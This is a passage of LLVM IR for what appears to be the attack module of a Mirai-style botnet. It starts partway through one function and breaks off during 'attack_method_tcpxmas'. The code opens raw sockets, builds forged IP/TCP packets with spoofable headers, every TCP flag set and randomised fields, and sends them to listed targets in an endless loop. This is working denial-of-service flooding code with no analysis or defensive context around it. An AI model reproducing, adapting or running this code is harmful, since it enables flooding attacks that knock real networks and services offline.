  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 3
  %357 = load i16, i16* %356, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  store i16 %357, i16* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 2
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 2
  store i32 %373, i32* %375, align 4
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 3
  store i32 %381, i32* %383, align 4
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -241
  %388 = or i16 %387, 128
  store i16 %388, i16* %385, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -257
  %393 = or i16 %392, 256
  store i16 %393, i16* %390, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 4
  %396 = load i16, i16* %395, align 4
  %397 = and i16 %396, -4097
  %398 = or i16 %397, 4096
  store i16 %398, i16* %395, align 4
  %399 = call i32 @rand_next()
  %400 = and i32 %399, 65535
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %18, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = and i16 %405, 1
  %410 = shl i16 %409, 13
  %411 = and i16 %408, -8193
  %412 = or i16 %411, %410
  store i16 %412, i16* %407, align 4
  %413 = load i8, i8* %19, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %414, 1
  %419 = shl i16 %418, 12
  %420 = and i16 %417, -4097
  %421 = or i16 %420, %419
  store i16 %421, i16* %416, align 4
  %422 = load i8, i8* %20, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = and i16 %423, 1
  %428 = shl i16 %427, 11
  %429 = and i16 %426, -2049
  %430 = or i16 %429, %428
  store i16 %430, i16* %425, align 4
  %431 = load i8, i8* %21, align 1
  %432 = sext i8 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 4
  %436 = and i16 %432, 1
  %437 = shl i16 %436, 10
  %438 = and i16 %435, -1025
  %439 = or i16 %438, %437
  store i16 %439, i16* %434, align 4
  %440 = load i8, i8* %22, align 1
  %441 = sext i8 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = and i16 %441, 1
  %446 = shl i16 %445, 9
  %447 = and i16 %444, -513
  %448 = or i16 %447, %446
  store i16 %448, i16* %443, align 4
  %449 = load i8, i8* %23, align 1
  %450 = sext i8 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = and i16 %450, 1
  %455 = shl i16 %454, 8
  %456 = and i16 %453, -257
  %457 = or i16 %456, %455
  store i16 %457, i16* %452, align 4
  %458 = load i8*, i8** %38, align 8
  %459 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %458, i32 noundef %459)
  br label %491

460:                                              ; preds = %235, %227
  %461 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 8
  %465 = and i16 %464, 1
  %466 = zext i16 %465 to i32
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %476, label %468

468:                                              ; preds = %460
  %469 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = lshr i16 %471, 10
  %473 = and i16 %472, 1
  %474 = zext i16 %473 to i32
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %479

476:                                              ; preds = %468, %460
  %477 = load i32, i32* %26, align 4
  %478 = call i32 @close(i32 noundef %477)
  br label %121

479:                                              ; preds = %468
  br label %480

480:                                              ; preds = %479
  br label %481

481:                                              ; preds = %480, %215
  br label %482

482:                                              ; preds = %481, %211, %203
  %483 = call i64 @time(i64* noundef null) #7
  %484 = load i64, i64* %31, align 8
  %485 = sub nsw i64 %483, %484
  %486 = icmp sgt i64 %485, 10
  br i1 %486, label %487, label %490

487:                                              ; preds = %482
  %488 = load i32, i32* %26, align 4
  %489 = call i32 @close(i32 noundef %488)
  br label %121

490:                                              ; preds = %482
  br label %191

491:                                              ; preds = %338
  br label %492

492:                                              ; preds = %491, %124
  %493 = load i32, i32* %9, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %9, align 4
  br label %115, !llvm.loop !23

495:                                              ; preds = %115
  br label %496

496:                                              ; preds = %606, %495
  store i32 0, i32* %9, align 4
  br label %497

497:                                              ; preds = %603, %496
  %498 = load i32, i32* %9, align 4
  %499 = load i8, i8* %5, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %498, %500
  br i1 %501, label %502, label %606

502:                                              ; preds = %497
  %503 = load i8**, i8*** %12, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds i8*, i8** %503, i64 %505
  %507 = load i8*, i8** %506, align 8
  store i8* %507, i8** %39, align 8
  %508 = load i8*, i8** %39, align 8
  %509 = bitcast i8* %508 to %struct.iphdr*
  store %struct.iphdr* %509, %struct.iphdr** %40, align 8
  %510 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i64 1
  %512 = bitcast %struct.iphdr* %511 to %struct.tcphdr*
  store %struct.tcphdr* %512, %struct.tcphdr** %41, align 8
  %513 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i64 1
  %515 = bitcast %struct.tcphdr* %514 to i8*
  store i8* %515, i8** %42, align 8
  %516 = load i16, i16* %14, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %525

519:                                              ; preds = %502
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 4
  br label %525

525:                                              ; preds = %519, %502
  %526 = load i8, i8* %25, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %531

528:                                              ; preds = %525
  %529 = load i8*, i8** %42, align 8
  %530 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %529, i32 noundef %530)
  br label %531

531:                                              ; preds = %528, %525
  %532 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* noundef %535, i32 noundef 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %542, i32 0, i32 1
  %544 = load i32, i32* %543, align 4
  %545 = add i32 %544, 1
  store i32 %545, i32* %543, align 4
  %546 = trunc i32 %544 to i16
  %547 = call zeroext i16 @htons(i16 noundef zeroext %546) #8
  %548 = zext i16 %547 to i32
  %549 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %554, i32 0, i32 2
  %556 = load i32, i32* %555, align 4
  %557 = trunc i32 %556 to i16
  %558 = call zeroext i16 @htons(i16 noundef zeroext %557) #8
  %559 = zext i16 %558 to i32
  %560 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  %562 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 0, i16* %563, align 4
  %564 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %565 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %566 = bitcast %struct.tcphdr* %565 to i8*
  %567 = load i32, i32* %24, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 20, %568
  %570 = trunc i64 %569 to i16
  %571 = call zeroext i16 @htons(i16 noundef zeroext %570) #8
  %572 = load i32, i32* %24, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 20, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %564, i8* noundef %566, i16 noundef zeroext %571, i32 noundef %575)
  %577 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 6
  store i16 %576, i16* %578, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 1
  %581 = load i16, i16* %580, align 2
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 1
  store i16 %581, i16* %587, align 2
  %588 = load i32, i32* %10, align 4
  %589 = load i8*, i8** %39, align 8
  %590 = load i32, i32* %24, align 4
  %591 = sext i32 %590 to i64
  %592 = add i64 40, %591
  %593 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = bitcast %struct.sockaddr_in* %598 to %struct.sockaddr*
  store %struct.sockaddr* %599, %struct.sockaddr** %593, align 8
  %600 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %601 = load %struct.sockaddr*, %struct.sockaddr** %600, align 8
  %602 = call i64 @sendto(i32 noundef %588, i8* noundef %589, i64 noundef %592, i32 noundef 16384, %struct.sockaddr* %601, i32 noundef 16)
  br label %603

603:                                              ; preds = %531
  %604 = load i32, i32* %9, align 4
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %9, align 4
  br label %497, !llvm.loop !24

606:                                              ; preds = %497
  br label %496

607:                                              ; preds = %202, %111, %105
  ret void
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #1

declare i64 @recvfrom(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32* noundef) #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpxmas(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #7
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %607

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %607

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %492, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %495

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %487, %476, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %492

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #8
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #8
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #7
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %490, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %607

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %482

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %482

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
